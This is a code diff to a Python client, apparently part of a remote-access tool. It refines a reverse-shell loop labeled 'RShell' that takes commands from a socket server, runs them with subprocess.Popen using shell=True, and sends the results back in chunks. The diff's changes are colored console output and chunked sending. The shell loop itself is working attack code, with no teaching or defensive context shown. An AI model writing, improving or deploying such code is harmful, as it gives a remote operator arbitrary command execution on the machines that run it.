@@ -4,6 +4,8 @@ import time
 import webbrowser
 import socket
 
+from colorama import Fore, Style
+
 HOST = '127.0.0.1'
 PORT = 1234
 
@@ -43,19 +45,22 @@ def socketStart():
         except socket.error as e:  # if server connection fails
             print("Connection error: {}".format(e))
 
-
 def rshell(s):
     while True:
         command = s.recv(1024).decode('utf-8').rstrip('\n')
-        print("RShell command: {}".format(command))
+        print(Fore.GREEN + "RShell remote command: {}".format(command) + Style.RESET_ALL)
         if command.lower() == 'exit':
             break
         output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         results = output.stdout.read().decode('utf-8')
         errors = output.stderr.read().decode('utf-8')
-        print("RShell results: {}".format(results if results else errors))
+        print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors))
+
         try:
-            s.send(results.encode("utf-8") if results else errors.encode("utf-8"))
+            data_to_send = (results if results else errors).encode("utf-8")
+            # Send data in chunks
+            for i in range(0, len(data_to_send), 1024):
+                s.sendall(data_to_send[i:i + 1024])
             print("Sent results.")
         except BrokenPipeError:
             print("Connection closed by server.")
